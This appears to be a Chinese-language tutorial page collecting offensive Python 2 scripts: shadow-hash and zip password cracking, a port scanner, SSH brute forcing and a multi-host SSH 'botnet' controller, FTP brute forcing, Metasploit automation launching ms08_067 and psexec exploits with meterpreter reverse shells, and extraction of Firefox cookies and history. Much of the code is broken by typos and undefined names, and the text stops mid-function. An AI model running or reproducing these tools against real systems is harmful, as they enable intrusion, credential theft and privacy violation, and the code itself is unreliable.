# 某教程涉及脚本

## 1、Linux口令破解

```python
# encoding: utf-8
import crypt


def testpass(cryptpass):
    #盐值，取两个$之间的字符串
    salt = cryptpass[cryptpass.find("$"):cryptpass.rfind("$")]
    #读取字典内容
    dictfile = open('dictionary.txt','r')
    #将字典里每行拿出来进行加密比对
    for word in dictfile.readlines():
        word = word.strip('\n')     # 去掉密码后的换行符
        # 将密码与盐值一起加密得到加密后的密文
        cryptword = crypt.crypt(word,salt)
        #将加密得到的密文与原始密文进行对比
        if (cryptword == cryptpass):
            print "[+] found password: " + word + "\n"
            return
    print "[-] password notfound.\n"
    return


def main():
    # 读取密码文件得到Linux口令
    passfile = open('mima.txt')
    # 对每一条口令进行破解
    for line in passfile.readlines():
        # 以口令中的:为分隔符
        if ":" in line:
            # 以第一个分隔符之前的为用户名
            user = line.split(':')[0]
            # 第一个分隔符与第二个之间的为加密口令
            cryptpass = line.split(':')[1].strip(' ')
            print "[*] cracking password for : " + user
            # 口令破解
            testpass(cryptpass)

if if __name__ == "__main__":
    main()
```

## 2、zip文件口令破解

{% tabs %}
{% tab title="01" %}
zipfile库最初体验

```python
# encoding: utf-8

import zipfile

# 实例化压缩文件
zfile = zipfile("test.zip")

try:
    # 使用正确的密码解压文件
    zfile.extractall(pwd="123456")
except Exception,e:
    print e
```
{% endtab %}

{% tab title="02" %}
使用extractall函数进行口令破解

```python
# encoding: utf-8

import zipfile

zfile = zipfile.ZipFile("test.zip")
# 打开字典
passfile = open('dictonary.txt')
# 遍历字典中的每一行
for line in passfile.readlines():
    # 去掉每一行末尾的换行符即为密码
    password = line.strip('\n')
    try:
        # 用每行的密码尝试解压文件
        zfile.extractall(pwd=password)
        # 解压成功，则打印密码
        print '[+] password = ' + password + '\n'
        exit(0)
    # 密码不正确则抛出异常并尝试下一个密码
    except Exception,e:
        pass
```
{% endtab %}

{% tab title="03" %}
添加了函数模块化

```python
# encoding: utf-8

import zipfile
# 模块化脚本，创建解压脚本函数
def extractfile(zfile,password):
    try:
        # 尝试解压文件，成功返回密码，否则抛出异常
        zfile.extractall(pwd = password)
        return password
    except:
        return

def mian():
    # 实例化压缩文件
    zfile = zipfile.ZipFile('test.zip')
    # 打开字典
    passfile = open('pass.txt')
    # 将字典每行的密码进行匹配
    for line in passfile.readlines():
        password = line.strip('\n')
        # 调用解压函数
        guess = extractfile(zfile,password)

        if guess:   # 要是guess是TRUE，则打印出密码
            print '[+] password = ' + password + '\n'
            exit(0)

if __name__ == "__main__":
    mian()
```
{% endtab %}
{% endtabs %}

## 3、端口扫描器

{% tabs %}
{% tab title="获取命令参数主机名和端口" %}


```python
# encoding: utf-8

import optparse
# 创建对象实例
parser = optparse.OptionParser('usage %prog  -H <target host> -p <target ports>')
# 需要的命令行参数
parser.add_option('-H',dest='Host',type='srting',help='specify target host')
parser.add_option('-p',dest='ports',type='srting',help='specify target host')

# 解析命令行
(Option,args) = parser.parse_args()
# 实例化参数
Host = Options.host
Ports = str(Options.Ports).split(',')
if (Host == None)|(Ports == None):
    print parser.usage
    exit(0)
```
{% endtab %}

{% tab title="加入connscan函数" %}


```python
# encoding: utf-8

import optparse
# 使用socket库
from socket import *

def connscan(host,port):
    try:
        # 实例化socket
        connskt = socket(AF_INET,SOCK_STREAM)
        # socket连接目标端口，连接成功则打印出该端口
        connskt.connect((host,port))
        print '[+] %d/tcp open'% port
        # 关闭连接
        connskt.close()

    except:
        # 端口连接不成功打印出错误信息
        print '[-] %d/tcp closed'% port

def portscan(host,ports):
    try:
        # 获取目标IP地址
        ip = gethostbyname(host)
    
    except:
        # 获取不到IP地址，打印出错误信息
        print "[-] cannot resolve '%s' : unknown host" %host
        return
    
    try:
        # 获取目标主机名
        name = gethostbyaddr(ip)
        print '\n[+] scan result for: '+name[0]
    
    except:
        # 获取不到主机名则显示IP
        print '\n[+] scan result for: '+ip
    # 设置默认超市时间
    setdefaulttimeout(1)
    # 遍历每个端口
    for port in ports:
        print 'scanning port '+port
        # 调用连接函数
        connscan(host,int(ports))
```
{% endtab %}

{% tab title="抓取目标应用banner，获取更详细信息" %}


```python
# encoding: utf-8

import parser
from socket import *

def connscan(host,port):
    try:
        connskt = socket(AF_INET,SOCK_STREAM)
        connskt.connect((host,port))
        # 向连接成功的端口发送字符串
        connskt.send('quiet simple\r\n')
        # 接收目标端口返回值
        results = connskt.recv(100)
        print '[+] %d/tcp open'% port
        # 打印出目标端口的发回执
        print '[+] ' + str(results)
        connskt.close()
    except:
        print '[-] %d/tcp closed'% port

def portscan(host,ports):
    try:
        ip = gethostbyname(host)
    except:
        print "[-] cannot resolve '%s': unknown host" %host
        return
    try:
        name = gethostbyaddr(ip)
        print '\n[+] scan results for :'+name[0]
    except:
        print '\n[+] scan results for :'+ip
    setdefaulttimeout(1)
    for port in ports:
        print 'scanning port' + port
        connscan(host,int(port))

def main():
    parser = optparse.optionparser('usage %prog -H <target host> -p <target ports>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-p',dest='ports',type='string',help='specify target ports')
    (options,args) = parser.parser_args()
    host = options.host
    ports = str(options.ports).split(',')
    if (host == None) | (ports == None):
        print parser.usage
        exit(0)
    # 调用函数进行扫描
    portscan(host,ports)

if __name__ == "__main__":
    main()
```
{% endtab %}

{% tab title="添加信号量以及加锁" %}


```python
# encoding: utf-8

import parser
from socket import *
from threading import *

# 实例化一个信号量
screenlock = Semaphore(value=1)
def connscan(host,port):
    try:
        connskt = socket(AF_INET,SOCK_STREAM)
        connskt.connect((host,port))
        connskt.send('quiet simple\r\n')
        results = connskt.recv(100)
        # 加锁
        screenlock.acquire()
        print '[+] %d/tcp open'% port
        print '[+] ' + str(results)
    except:
        screenlock.acquire()
        print '[-] %d/tcp closed'% port
    finally:
        # 解锁
        screenlock.release()
        connskt.close()

def portscan(host,ports):
    try:
        ip = gethostbyname(host)
    except:
        print "[-] cannot resolve '%s': unknown host" %host
        return
    try:
        name = gethostbyaddr(ip)
        print '\n[+] scan results for :'+name[0]
    except:
        print '\n[+] scan results for :'+ip
    setdefaulttimeout(1)
    for port in ports:
        print 'scanning port' + port
        connscan(host,int(port))

def main():
    parser = optparse.optionparser('usage %prog -H <target host> -p <target ports>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-p',dest='ports',type='string',help='specify target ports')
    (options,args) = parser.parser_args()
    host = options.host
    ports = str(options.ports).split(',')
    if (host == None) | (ports == None):
        print parser.usage
        exit(0)
    portscan(host,ports)

if __name__ == "__main__":
    main()
```
{% endtab %}
{% endtabs %}

### 

## 4、构建SSH僵尸网络

{% tabs %}
{% tab title="pexpect库" %}


```python
# encoding: utf-8

# 引用第三方库
import pexpect
# 命令行提示符
PROMPT = ['#','>>>','>','\$']
# 传递命令
def send_command(child,cmd):
    child.sendline(cmd)
    # 期望获得的命令提示符
    child.expect(PROMPT)
    # 打印从SSH会话得到的结果
    print child.before

# 连接函数
def connect(user,host,password):
    ssh_newkey = 'are you sure you want to continue connecting'
    # 连接字符串
    connstr = 'ssh ' + user + '@' + host
    # 实例化连接
    child = pexpect.spawn(connstr)
    # 捕获ssh_newkey
    ret = child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword: '])
    # 判断捕获信息
    if ret == 0:
        print '[-] error connecting'
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword: '])
        if ret == 0:
            print '[-] error connecting'
            return
    # 输入密码
    child.sendline(password)
    # 捕获命令提示符
    child.expect(PROMPT)
    return child

def main():
    host = 'localhost'
    user = 'root'
    password = 'simple123'
    # ssh连接
    child = connect(user,host,password)
    # 发送命令
    send_command(child,'ls /root/')

if __name__ == "__main__":
    main()
```
{% endtab %}

{% tab title="pxssh\(\)函数" %}


```python
# encoding: utf-8

# 引用pxssh库
from pexpect import pxssh
# 引用optparse库
import optparse
# 引用time库
import time
# 引用线程库
from threading import *

# 设置最大连接数
maxconnections = 5
# 设置连接锁
connection_lock = BoundedSemaphore(value=maxconnections)
found = False
fails = 0

# 连接函数
def connect(host,user,password,release):
    #全局变量
    global found
    global fails
    try:
        # 实例化
        s = pxssh.pxssh()
        # SSH连接
        s.login(host,user,password)
        # 连接成功打印密码
        print '[+] password found: ' + password
        found = True
    except Exception,e:
        # 判断异常原因，尝试重新连接
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        # 释放锁
        if release:
            connection_lock.release()

def mian():
    # 创建对象
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    # 设定参数
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-F',dest='password file',type='string',help='specify password file')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    # 解析命令
    (options,args) = parser.parser_args()
    # 获取参数
    host = options.host
    passwordfile = options.passwordfile
    user = options.user
    if host == None or passwordfile == None or user == None:
        print parser.usage
        exit(0)
    # 读取密码
    fn = open('passwordfile','r')
    # 尝试破解
    for line in fn.readlines():
        if found:
            print "[*] exiting: password found"
            exit(0)
        if fails > 5:
            print "[*] exiting: too many socket Timeouts"
            exit(0)
        # 加锁
        connection_lock.acquire()
        password = line.strip('\n')
        print "[-] testing: " + str(password)
        #实例化线程
        t = Thread(target=connect,args=(host,user,password,True))
        child = t.start

if __name__ == "__main__":
    main()
```
{% endtab %}

{% tab title="控制多台主机的版本" %}


```python
# encoding: utf-8

from pexpect import pxssh

class client:
    # 初始化对象
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
    # SSH连接
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception,e:
            print e 
            print '[-] error connecting'
    # 传递命令
    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# 遍历botnet发送命令
def botnetcommand(command):
    for client in botnet:
        output = client.send_command(command)
        print '[*] output from ' + client.host
        print '[+] ' + output

# 实例化client对象
def addclient(host,user,password):
    client = client(host,user,password)
    botnet.append(client)

# 记录client对象
botnet = []
addclient('127.0.0.1','root','simplexue123')
addclient('127.0.0.1','root','simplexue123')
addclient('127.0.0.1','root','simplexue123')

botnetcommand('uname -v')
botnetcommand('ls /root')
```
{% endtab %}
{% endtabs %}



## 5、FTP口令扫描与网页搜索

{% tabs %}
{% tab title="确定服务器是否允许匿名登录" %}


```python
# encoding: utf-8

# 引用ftplib库
import ftplib

# 判断目标是否允许匿名登录
def anonlogin(hostame):
    try:
        ftp = ftplib.FTP(hostame)
        # 匿名登录
        ftp.login('anonymous','me@youer.com')
        print '\n[*]' + str(hostame) + 'FTP anonymous login successded'
        ftp.quit()
        return True
    except Exception,e:
        print '\n[-] ' +str(hostame) + 'FTP anonymous logon failed.'
        return False

host = '192.168.1.3'
anonlogin(host)
```
{% endtab %}

{% tab title="FTP暴力破解" %}


```python
# encoding: utf-8

import ftplib

# 暴力破解FTP口令
def brutelogin(hostname,passwdfile):
    p = open('passwdfile','r')
    # 尝试用每个口令登录目标FTP
    for line in p.readlines():
        user = line.split(':')[0]
        p = line.split(':')[1].strip('\n')
        print '[+] trying: ' + user + ': ' + p
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user,p)
            print '\n[*]' + srt(hostname) + 'FTP login succeeded: ' + user +':' + p
            ftp.quit()
            return (user,p)
        except Exception,e:
            pass 
    print '\n[-] could not brute force ftp credentials.'
    return (None,None)

host = '192.168.1.3'
passwdfile = 'pass.txt'
brutelogin(host,passwdfile)
```
{% endtab %}

{% tab title="FTP网页搜索脚本" %}


```python
# encoding: utf-8

import ftplib

# 发现默认页面
def returndefault(ftp):
    try:
        # 获取FTP目录
        dirlist = ftp.nlist()
    except:
        dirlist = []
        print '[-] could not list directory contents'
        print '[-] skipping to next target'
        return
    # 默认页面列表
    retlist = []
    for filename in dirlist:
        fn = filename.lower()
        # 寻找特定后缀的文件名
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] found  default page: ' + filename
            retlist.append(filename)
            return retlist

host = '192.168.1.3'
username = 'administrator'
password = '123456'
# 实例化FTP连接
ftp = ftplib.FTP(host)
ftp.login(username,password)
returndefault(ftp)
```
{% endtab %}

{% tab title="前三个脚本的整合" %}


```python
# encoding: utf-8

import ftplib
import optparse

# 匿名登录
def anonlogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','me@youer.com')
        print '\n[*]' + str(hostame) + 'FTP anonymous login successded'
        ftp.quit()
        return True
    except Exception,e:
        print '\n[-] ' +str(hostame) + 'FTP anonymous logon failed.'
        return False

# 破解口令
def brutelogin(hostname,passwdfile):
    p = open('passwdfile','r')
    for line in p.readlines():
        user = line.split(':')[0]
        p = line.split(':')[1].strip('\n')
        print '[+] trying: ' + user + ': ' + p
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user,p)
            print '\n[*]' + srt(hostname) + 'FTP login succeeded: ' + user +':' + p
            ftp.quit()
            return (user,p)
        except Exception,e:
            pass 
    print '\n[-] could not brute force ftp credentials.'
    return (None,None)

# 发现默认页面
def returndefault(ftp):
    try:
        dirlist = ftp.nlist()
    except:
        dirlist = []
        print '[-] could not list directory contents'
        print '[-] skipping to next target'
        return
    retlist = []
    for filename in dirlist:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] found  default page: ' + filename
            retlist.append(filename)
            return retlist

def mian():
    parser = optparse.OptionParser('usage %prog -H <target host[s]> [-f <userpass file>]')
    parser.add_option('-H',dest='thost',type='string',help='specify target host')
    parser.add_option('-f',dest='passwdfile',type='string',help='specify user/password file')
    (options,args) = parser.parser_args()
    thost = options.thost
    passwdfile = options.passwdfile
    if thost == None:
        print parser.usage
        exit (0)
    username = None
    password = None
    # 尝试匿名登录
    if anonlogin(thost) == True:
        username = 'administrator'
        password = '123456'
        ftp = ftplib.FTP(thost)
        ftp.login(username,password)
        returndefault(ftp)
    # 尝试暴力破解登录
    elif passwdfile != None:
        (username,password) = brutelogin(thost,passwdfile)
        ftp = ftplib.FTP(thost)
        ftp.login(username,password)
        returndefault(ftp)

if __name__ == "__main__":
    main()
```
{% endtab %}
{% endtabs %}



## 6、python脚本与metasploit交互

{% tabs %}
{% tab title="扫描开放了445端口的主机" %}
```python
# encoding: utf-8

# 使用nmap库
import nmap

def findtarget():
    # 实例化端口扫描
    nmscan = nmap,portscanner()
    # 扫描开放了445端口的主机并将其放置在数组中返回
    nmscan.scan(subnet,'445')
    targets = []
    for t in nmscan.all_hosts():
        if nmscan[t].has_tcp(445):
            state = nmscan[t]['tcp'][445]['state']
            if state == 'open':
                print '[+] found target host: ' + t
                targets.append(t)
    return targets
```
{% endtab %}

{% tab title="新建监听器" %}
```python
# encoding: utf-8
## 

# 监听被黑掉的目标
def setuphandler(configfile,lhost,lport):
    # 使用该模块发布命令
    configfile.write('use exploit/multi/handler\n')
    # 设定载荷，IP，端口
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
    # 不重复新建监听器
    configfile.write('setg DisablePaloadHandler 1\n')
```
{% endtab %}

{% tab title="执行漏洞利用代码" %}
```python
# encoding: utf-8

# 漏洞利用
def setuphandler(configfile,target,lhost,lport):
    # 漏洞利用代码
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    # 设定参数
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    # 执行
    configfile.write('exploit -j -z\n')
```
{% endtab %}

{% tab title="暴力破解SMB用户" %}
```python
# encoding: utf-8

# SMB暴力破解
def smbbrute(configfile,target,passwdfile,lhost,lport):
    username = 'Administrator'
    passwdfile = open(passwdfile,'r')
    # 逐个密码尝试进行破解
    for password in passwdfile.readlines():
        password = password.strip('\n').strip
    configfile.write('use exploit/windows/smb/psexec\n')
    configfile.write('set SMBUser ' + str(username) + '\n')
    configfile.write('set SMBUser ' + str(password) + '\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
```
{% endtab %}

{% tab title="前四个代码的整合" %}
```python
# encoding: utf-8
## 
import os
import optparse
import sys
import nmap

# 与nmap交互发现开放了445端口的主机
def findtarget():
    # 实例化端口扫描
    nmscan = nmap,portscanner()
    nmscan.scan(subnet,'445')
    targets = []
    for t in nmscan.all_hosts():
        if nmscan[t].has_tcp(445):
            state = nmscan[t]['tcp'][445]['state']
            if state == 'open':
                print '[+] found target host: ' + t
                targets.append(t)
    return targets

# 监听被黑掉的目标
def setuphandler(configfile,lhost,lport):
    configfile.write('use exploit/multi/handler\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
    configfile.write('setg DisablePaloadHandler 1\n')

# 攻击模块
def setuphandler(configfile,target,lhost,lport):
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')

# SMB暴力破解
def smbbrute(configfile,target,passwdfile,lhost,lport):
    username = 'Administrator'
    passwdfile = open(passwdfile,'r')
    for password in passwdfile.readlines():
        password = password.strip('\n').strip
    configfile.write('use exploit/windows/smb/psexec\n')
    configfile.write('set SMBUser ' + str(username) + '\n')
    configfile.write('set SMBUser ' + str(password) + '\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')

def main():
    # 写方式打开配置文件
    configfile = open('meta.rc','w')
    parser = optparse.optionparser('[-] usage %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT -F <password file>]')
    parser.add_option('-H',dest='target',type='string',help='specify the target address[es]')
    parser.add_option('-p',dest='lport',type='string',help='specify the listen port')
    parser.add_option('-l',dest='lhost',type='string',help='specify the listen address')
    parser.add_option('-F',dest='passwdfile',type='string',help='password file for SMB brute force attempt')
    (options,args) = parser.parser_args()
    if (opyions.target == None) | (lhost == None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '2333'
    passsdfile = options.passsdfile
    # 寻找目标
    targets = findtarget(options.target)
    setuphandler(configfile,lhost,lport)
    # 逐个攻击
    for target in targets:
        confickerexploit(configfile,target,lhost,lport)
        if passwdfile != None:
            smbbrute(configfile,target,passsdfile,lhost,lport)
    configfile.close()
    # 启动metasploit并读取配置文件
    os.system('msfconsole -r meta.rc')

if __name__ == "__main__":
        main()
```
{% endtab %}
{% endtabs %}



## 7、回收站内容检查

{% tabs %}
{% tab title="检测回收站目录" %}
```python
# encoding: utf-8

import os

def returndir():
    dirs = ['C:\\Recycler\\','C:\\Recycled\\','C:\\Recycle.Bin\\']
    for recycledir in dirs:
        if os.path.isdir(recycledir):
            return recycledir
        return None

print returndir()
```
{% endtab %}

{% tab title="提取注册表中的用户名" %}
```python
# encoding: utf-8

# 导入注册表库
from _winreg import *

#提取注册表中存放的用户名
def sid2user(sid):
    try:
        key = Openkey(HKEY_LOCAL_MAACHINE,"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" + '\\' + sid)
        (Value,type) = QueryValueEx(key,'ProfileImagePath')
        user = value.split('\\')[-1]
        return user
    except:
        return sid
```
{% endtab %}

{% tab title="打印所有被放入回收站的文件" %}
```python
# encoding: utf-8

import os
from _winreg import *

def sid2user(sid):
    try:
        key = Openkey(HKEY_LOCAL_MAACHINE,"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" + '\\' + sid)
        (Value,type) = QueryValueEx(key,'ProfileImagePath')
        user = value.split('\\')[-1]
        return user
    except:
        return sid

def returndir():
    dirs = ['C:\\Recycler\\','C:\\Recycled\\','C:\\Recycle.Bin\\']
    for recycledir in dirs:
        if os.path.isdir(recycledir):
            return recycledir
        return None

def findrecycled(recycledir):
    dirlist = os.listdir(recycledir)
    for sid in dirlist:
        files = os.listdir(recycledir + sid)
        user = sid2user(sid)
        print '\n[*] listing files for user:' + str(user)
        for file in files:
            print '[+] found file: ' + str(file)
        
def mian():
    recycledir = returndir()
    findrecycled(recycledir)

if __name__ == "__main__":
    main()

```
{% endtab %}
{% endtabs %}



## 8、读取文件EXIF元数据

{% tabs %}
{% tab title="查找image标签" %}
```python
# encoding: utf-8

import urllib2
# 导入相关库
from bs4 import BeautifulSoup

# 发现网页中的图片
def findimages(url):
    print '[+\ finding images on ' + url
    # 读取HTML中的文档内容
    urlcontent = urllib2.open(url).read()
    # 创建一个beautifulsoup对象
    soup = BeautifulSoup(urlcontent,"lxml")
    # 寻找所有标记为img的标签
    imgtags = soup.findall('img')
    return imgtags
```
{% endtab %}

{% tab title="下载图片" %}
```python
# encoding: utf-8

# 导入相应库
import urllib2
from os.path import basename
from urlparse import urlsplit

# 下载图片
def downloadimage(imgtag,url):
    try:
        print '[+] downloading image...'
        # 图片地址
        imgsrc = imgtag['src']
        # 读取图片内容
        imgcontent = urllib2.urlopen(url + imgsrc).read()
        imgfilename = basename(urlsplit(imgsrc0[2]))
        imgfile = open(imgfilename,'wb')
        # 写入图片内容
        imgfile.write(imgcontent)
        imgfile.close()
        return imgfilename
    except:
        return ''
```
{% endtab %}

{% tab title="获取文件元数据" %}
```python
# encoding: utf-8

def testforexif(imgfilename):
    try:
        exifdata = {}
        imgfile = image.open(imgfilename)
        # 获取文件中的元数据
        info = imgfile._getexif()
        if info:
            # 遍历元数据数组查找含有GPSInfo的exif标签
            for (tag,value) in info.items():
                decoded = tags.get(tag,tag)
                exifdata[decoded] = value
            exifgps = exifdata['gpsinfo']
            if exifgps:
                print '[*] ' + imgfilename + ' cintains GPS metadata'
    except:
        pass
```
{% endtab %}

{% tab title="代码整合" %}
```python
# encoding: utf-8

# 导入相应库
import urllib2
import optparse
from bs4 import BeautifulSoup
from urlparse import urlsplit
from os.path import basename
from PIL import image
from PIL.exiftags import tags

# 寻找图片标签
def findimages(url):
    print '[+\ finding images on ' + url
    # 读取HTML中的文档内容
    urlcontent = urllib2.open(url).read()
    # 创建一个beautifulsoup对象
    soup = BeautifulSoup(urlcontent,"lxml")
    # 寻找所有标记为img的标签
    imgtags = soup.findall('img')
    return imgtags

# 下载图片
def downloadimage(imgtag,url):
    try:
        print '[+] downloading image...'
        # 图片地址
        imgsrc = imgtag['src']
        # 读取图片内容
        imgcontent = urllib2.urlopen(url + imgsrc).read()
        imgfilename = basename(urlsplit(imgsrc0[2]))
        imgfile = open(imgfilename,'wb')
        # 写入图片内容
        imgfile.write(imgcontent)
        imgfile.close()
        return imgfilename
    except:
        return ''

# 查看元数据寻找GPSInfo
def testforexif(imgfilename):
    try:
        exifdata = {}
        imgfile = image.open(imgfilename)
        # 获取文件中的元数据
        info = imgfile._getexif()
        if info:
            # 遍历元数据数组查找含有GPSInfo的exif标签
            for (tag,value) in info.items():
                decoded = tags.get(tag,tag)
                exifdata[decoded] = value
            exifgps = exifdata['gpsinfo']
            if exifgps:
                print '[*] ' + imgfilename + ' cintains GPS metadata'
    except:
        pass

# 主函数运行
def main():
    parser = optparse.optionparser('usage %prog -u <target url>')
    parser.add_option('-u',dest='url',type='string',help='specify url address')
    (options,args) = parser.parser_args()
    url = options.url
    if url == None:
        print parser.usage
        exit(0)
    else:
        imgtags = findimages(url)
        for imgtag in imgtags:
            imgfilename = downloadimage(imgtag,url)
            testforexif(imgfilename)

if __name__ == "__main__":
    mian()
```
{% endtab %}
{% endtabs %}



## 9、解析火狐浏览器ssqlite3数据库

{% tabs %}
{% tab title="读取数据库信息" %}


```python
# -*- coding: utf-8 -*-

import sqlite3  #导入库

def printDownloads(downloadDB): #查看下载记录
    conn = sqlite3.connect(downloadDB)  #链接数据库
    c = conn.cursor()   #实例化
    c.execute('SELECT name,source,datetime(endTime/1000000,\'unixepoch\') FORM moz_downloads;') #数据库查询
    print '\n[*] --- Files Downloaded ---'
    for row in c:
        print '[+] Fiel: ' + str(row[0]) + 'from source: ' + str(row[1]) + 'at:' + str(row[2])

def main():
    downloadDB = 'downloads.sqlite'
    printDownloads(downloadDB)

if __name__ == '__main__':
    main()

```
{% endtab %}

{% tab title="读取用户cookie" %}


```python
import sqlite3  #导入库

def printCookies(cookiesDB): #读取cookie数据库内容
    try:
        conn = sqlite3.connect(cookiesDB)  #链接数据库
        c = conn.cursor()   #实例化
        c.execute('SELECT host,name,value FORM moz_cookies;') #数据库查询
        print '\n[*] --- Found Cookies ---'
        for row in c:
            host = str(row[0])
            name = str(row[1])
            value = str(row[2])
            print '[+] Host: ' + host + 'name: ' + name + 'Value:' + value
    except Exception,e:
        if 'encrypted' in str(e):
            print '\n[*] Error reading your cookies database. '
            print '[*] Upgrade your Python-sqlite3 Library'
def main():
    cookiesDB = 'cookies.sqlite'
    printCookies(cookiesDB)

if __name__ == '__main__':
    main()
```
{% endtab %}

{% tab title="读取历史记录" %}


```python
# -*- coding: utf-8 -*-

import sqlite3

# 读取历史记录
def printHistory(placesDB):
    try:
        conn = sqlite3.connect(placesDB)
        c = conn.cursor()
        # 数据库查询
        c.execute('select url, datetime(visit_date/1000000, \'unixepoch\') from moz_places,moz_historyvisits where visit_count > 0 and moz_places.id == moz_historyvisits.places_id;')
        print '\n[*] -- Found History --'
        for row in c:
            url = str(row[0])
            date = str(row[1])
            print '[+]'+ date + '  -Visited: ' + url
    except Exception,e:
        if 'encrypted' in str(e):
            print '\n[*] Error readming your places database.'
            print '[*] Upgrade your Python-Sqlite2 Library.'
            exit(0)

def main():
    placesDB = 'places.sqlite'
    printHistory(placesDB)

if __name__ == '__main__':
    main()
```
{% endtab %}

{% tab title="获取谷歌搜索记录" %}


```python
# -*- coding: utf-8 -*-

import sqlite3
import re

# 读取历史记录
def printGoogle(placesDB):
    try:
        conn = sqlite3.connect(placesDB)
        c = conn.cursor()
        # 数据库查询
        c.execute('select url, datetime(visit_date/1000000, \'unixepoch\') from moz_places,moz_historyvisits where visit_count > 0 and moz_places.id == moz_historyvisits.places_id;')
        print '\n[*] -- Found Google --'
        for row in c:
            url = str(row[0])
            date = str(row[1])
            if 'google' in url.lower():
                r = re.findall(r'q=.*\&', url)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=','').replace('+','')
                    print '[+]'+ date + '  -Searched For: ' + search
    except Exception,e:
        print e

def main():
    placesDB = 'places.sqlite'
    printGoogle(placesDB)

if __name__ == '__main__':
    main()
```
{% endtab %}

{% tab title="脚本整合" %}


```python
# -*- coding: utf-8 -*-

import optparse
import os
import sqlite3
import re

def printDownloads(downloadDB): #查看下载记录
    conn = sqlite3.connect(downloadDB)  #链接数据库
    c = conn.cursor()   #实例化
    c.execute('SELECT name,source,datetime(endTime/1000000,\'unixepoch\') FORM moz_downloads;') #数据库查询
    print '\n[*] --- Files Downloaded ---'
    for row in c:
        print '[+] Fiel: ' + str(row[0]) + 'from source: ' + str(row[1]) + 'at:' + str(row[2])

def printCookies(cookiesDB): #读取cookie数据库内容
    try:
        conn = sqlite3.connect(cookiesDB)  #链接数据库
        c = conn.cursor()   #实例化
        c.execute('SELECT host,name,value FORM moz_cookies;') #数据库查询
        print '\n[*] --- Found Cookies ---'
        for row in c:
            host = str(row[0])
            name = str(row[1])
            value = str(row[2])
            print '[+] Host: ' + host + 'name: ' + name + 'Value:' + value
    except Exception,e:
        if 'encrypted' in str(e):
            print '\n[*] Error reading your cookies database. '
            print '[*] Upgrade your Python-sqlite3 Library'


def printHistory(placesDB):
    try:
        conn = sqlite3.connect(placesDB)
        c = conn.cursor()
        # 数据库查询
        c.execute('select url, datetime(visit_date/1000000, \'unixepoch\') from moz_places,moz_historyvisits where visit_count > 0 and moz_places.id == moz_historyvisits.places_id;')
        print '\n[*] -- Found History --'
        for row in c:
            url = str(row[0])
            date = str(row[1])
            print '[+]'+ date + '  -Visited: ' + url
    except Exception,e:
        if 'encrypted' in str(e):
            print '\n[*] Error readming your places database.'
            print '[*] Upgrade your Python-Sqlite2 Library.'
            exit(0)
# 读取历史记录
def printGoogle(placesDB):
    try:
        conn = sqlite3.connect(placesDB)
        c = conn.cursor()
        # 数据库查询
        c.execute('select url, datetime(visit_date/1000000, \'unixepoch\') from moz_places,moz_historyvisits where visit_count > 0 and moz_places.id == moz_historyvisits.places_id;')
        print '\n[*] -- Found Google --'
        for row in c:
            url = str(row[0])
            date = str(row[1])
            if 'google' in url.lower():
                r = re.findall(r'q=.*\&', url)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=','').replace('+','')
                    print '[+]'+ date + '  -Searched For: ' + search
    except Exception,e:
        print e

def main():
    parser = optparse.OptionParser('Usage %prog -p <firefox profile path>')
    parser.add_option('-p',dest='pathName',type='string',help='specify skype profile path')
    (options,args) = parser.parse_args()
    pathName = options.pathName
    if pathName == None:
        print parser.usage
        exit(0)
    elif os.path.isdir(pathName) == False:
